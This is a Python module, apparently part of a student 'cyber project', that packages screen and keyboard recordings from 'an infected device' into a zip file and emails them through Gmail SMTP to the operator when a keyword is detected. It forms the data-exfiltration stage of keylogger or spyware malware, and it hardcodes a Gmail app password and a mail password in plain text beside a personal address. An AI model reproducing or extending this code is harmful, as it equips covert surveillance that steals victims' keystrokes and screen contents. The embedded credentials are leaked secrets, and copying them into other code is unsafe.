import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os
import logging

import Encoder

def SendMail(Client, Filepath, RSAword):
    # Setup port number and server name

    smtp_port = 587  # Standard secure SMTP port
    smtp_server = "smtp.gmail.com"  # Google SMTP Server

    # Set up the email lists
    Email_Sender = "CyberProjNoReply@gmail.com"
    Email_Reciever = Client.MailAdress

    # Define the password (better to reference externally)
    pswd = "xnbwcaoxnecitywu"  # As shown in the video this password is now dead, left in as example only
    # mail password is ccjik#314

    # name the email subject
    Subject = "KeyWord detected!"

    # Make the body of the email
    body = f"""
            Hey {Client.Name} !
            A keyword was detected in an infected device!, check out the screen and keyboard recordings
            
            the password is 
            {RSAword.encrypt()} ;)
            """

    # make a MIME object to define parts of the email
    msg = MIMEMultipart()
    msg['From'] = Email_Sender
    msg['To'] = Email_Reciever
    msg['Subject'] = Subject

    # Attach the body of the message
    msg.attach(MIMEText(body, 'plain'))

    backslash = r'\n'[0]
    Recordingspath = os.path.join(Filepath, "Recordings")

    #define the zip file to send
    ZipFilename = os.path.join(Filepath, "SendMe.zip")

    # Open the file in python as a binary
    ZipAttachment = open(ZipFilename, 'rb')  # r for read and b for binary

    # Encode as base 64
    attachment_package = MIMEBase('application', 'octet-stream')
    attachment_package.set_payload((ZipAttachment).read())
    encoders.encode_base64(attachment_package)
    attachment_package.add_header('Content-Disposition', "attachment; filename= " + ZipFilename)
    msg.attach(attachment_package)


    # Cast as string
    text = msg.as_string()

    # Connect with the server
    logging.info("Connecting to server...")
    print("Connecting to server...")
    TIE_server = smtplib.SMTP(smtp_server, smtp_port)
    TIE_server.starttls()
    TIE_server.login(Email_Sender, pswd)
    logging.info("Succesfully connected to server")
    print("Succesfully connected to server")
    print()

    # Send emails to "person" as list is iterated
    logging.info(f"Sending email to: {Email_Reciever}...")
    print(f"Sending email to: {Email_Reciever}...")
    TIE_server.sendmail(Email_Sender, Email_Reciever, text)
    logging.info(f"Email sent to: {Email_Reciever}")
    print(f"Email sent to: {Email_Reciever}")
    print()

    # Close the port
    TIE_server.quit()






#SendMail(Client("dan.ori.akunis@gmail.com", "Ori", Filepath)
